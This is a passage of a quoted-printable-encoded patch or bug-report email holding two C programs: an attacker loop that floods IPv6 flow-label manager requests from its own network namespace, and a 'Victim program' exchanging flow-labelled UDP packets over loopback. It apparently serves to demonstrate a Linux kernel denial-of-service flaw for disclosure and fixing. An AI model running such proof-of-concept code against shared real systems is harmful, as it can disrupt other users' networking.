+#include <stdbool.h>=0A=
+=0A=
+=0A=
+int main() {=0A=
+	int fd1, ret, pid;=0A=
+	unshare(CLONE_NEWNET);=0A=
+	if ((fd1 =3D socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDPLITE)) < 0)=0A=
+		error(1, errno, "socket");=0A=
+	struct in6_flowlabel_req req =3D {=0A=
+		.flr_action =3D IPV6_FL_A_GET,=0A=
+		.flr_label =3D 0,=0A=
+		.flr_flags =3D 0,=0A=
+		.flr_share =3D IPV6_FL_S_USER,=0A=
+	};=0A=
+	req.flr_dst.s6_addr[0] =3D 0xfd;=0A=
+ 	req.flr_dst.s6_addr[15] =3D 0x1;=0A=
+=0A=
+	while(1) {=0A=
+		ret =3D setsockopt(fd1, SOL_IPV6, IPV6_FLOWLABEL_MGR, &req, sizeof(req));=
+=0A=
+	}=0A=
+=0A=
+	return 0;=0A=
+}=0A=
+=0A=
+=0A=
+=0A=
+Victim program:=0A=
+=0A=
+#define _GNU_SOURCE=0A=
+#include <linux/in6.h>=0A=
+#include <stdio.h>=0A=
+#include <stdlib.h>=0A=
+#include <fcntl.h>=0A=
+#include <string.h>=0A=
+#include <sys/socket.h>=0A=
+#include <netinet/in.h>=0A=
+#include <unistd.h>=0A=
+#include <error.h>=0A=
+#include <errno.h>=0A=
+#include <sched.h>=0A=
+#include <stdbool.h>=0A=
+=0A=
+static const char cfg_data[] =3D "a";=0A=
+=0A=
+static void do_send(int fd, struct sockaddr_in6 addr, bool with_flowlabel, =
+uint32_t flowlabel)=0A=
+ {=0A=
+ 	char control[CMSG_SPACE(sizeof(flowlabel))] =3D {0};=0A=
+ 	struct msghdr msg =3D {0};=0A=
+ 	struct iovec iov =3D {0};=0A=
+ 	int ret;=0A=
+=0A=
+ 	iov.iov_base =3D (char *)cfg_data;=0A=
+ 	iov.iov_len =3D sizeof(cfg_data);=0A=
+=0A=
+ 	msg.msg_iov =3D &iov;=0A=
+ 	msg.msg_iovlen =3D 1;=0A=
+	msg.msg_name =3D &addr;=0A=
+	msg.msg_namelen =3D sizeof(addr);=0A=
+=0A=
+ 	if (with_flowlabel) {=0A=
+ 		struct cmsghdr *cm;=0A=
+=0A=
+ 		cm =3D (void *)control;=0A=
+ 		cm->cmsg_len =3D CMSG_LEN(sizeof(flowlabel));=0A=
+ 		cm->cmsg_level =3D SOL_IPV6;=0A=
+ 		cm->cmsg_type =3D IPV6_FLOWINFO;=0A=
+ 		*(uint32_t *)CMSG_DATA(cm) =3D htonl(flowlabel);=0A=
+=0A=
+ 		msg.msg_control =3D control;=0A=
+ 		msg.msg_controllen =3D sizeof(control);=0A=
+ 	}=0A=
+=0A=
+ 	ret =3D sendmsg(fd, &msg, 0);=0A=
+=0A=
+	fprintf(stderr, "sendmsg ret =3D %d\n", ret);=0A=
+}=0A=
+=0A=
+static void do_recv(int fd, bool with_flowlabel, uint32_t expect)=0A=
+ {=0A=
+ 	char control[CMSG_SPACE(sizeof(expect))];=0A=
+ 	char data[sizeof(cfg_data)];=0A=
+ 	struct msghdr msg =3D {0};=0A=
+ 	struct iovec iov =3D {0};=0A=
+ 	struct cmsghdr *cm;=0A=
+ 	uint32_t flowlabel;=0A=
+ 	int ret;=0A=
+=0A=
+ 	iov.iov_base =3D data;=0A=
+ 	iov.iov_len =3D sizeof(data);=0A=
+=0A=
+ 	msg.msg_iov =3D &iov;=0A=
+ 	msg.msg_iovlen =3D 1;=0A=
+=0A=
+=0A=
+ 	memset(control, 0, sizeof(control));=0A=
+ 	msg.msg_control =3D control;=0A=
+ 	msg.msg_controllen =3D sizeof(control);=0A=
+=0A=
+ 	recvmsg(fd, &msg, 0);=0A=
+}=0A=
+=0A=
+int main() {=0A=
+	int fd1, ret, pid;=0A=
+	unshare(CLONE_NEWNET);=0A=
+	pid =3D fork();=0A=
+	if (pid =3D=3D 0) {=0A=
+		execlp("ip", "ip", "link", "set", "dev", "lo", "up", NULL);=0A=
+	}=0A=
+	sleep(1);=0A=
+	struct sockaddr_in6 src_addr =3D {=0A=
+ 		.sin6_family =3D AF_INET6,=0A=
+ 		.sin6_port =3D htons(7000),=0A=
+ 		.sin6_addr =3D in6addr_loopback,=0A=
+		.sin6_flowinfo =3D htonl(0),=0A=
+		.sin6_scope_id =3D 0,=0A=
+ 	};=0A=
+	struct sockaddr_in6 dst_addr =3D {=0A=
+ 		.sin6_family =3D AF_INET6,=0A=
+ 		.sin6_port =3D htons(8000),=0A=
+ 		.sin6_addr =3D in6addr_loopback,=0A=
+		.sin6_flowinfo =3D htonl(0),=0A=
+		.sin6_scope_id =3D 0,=0A=
+ 	};=0A=
+	pid =3D fork();=0A=
+	int fd2;=0A=
+	if (pid =3D=3D 0) {=0A=
+		if((fd2 =3D socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)) < 0)=0A=
+			error(1, errno, "socket");=0A=
+		if(bind(fd2, (void *)&dst_addr, sizeof(dst_addr)) < 0)=0A=
+			error(1, errno, "bind");=0A=
+		while(1) {=0A=
+			do_recv(fd2, true, 123456);=0A=
+		}=0A=
+		return 0;=0A=
+		=0A=
+	}=0A=
+	sleep(1);=0A=
+	if((fd2 =3D socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)) < 0)=0A=
+ 		error(1, errno, "socket");=0A=
+	while(1) {=0A=
+		do_send(fd2, dst_addr, true, 123456);=0A=
+		usleep(100000);=0A=
+	}=0A=
+=0A=
+	return 0;=0A=
+}=
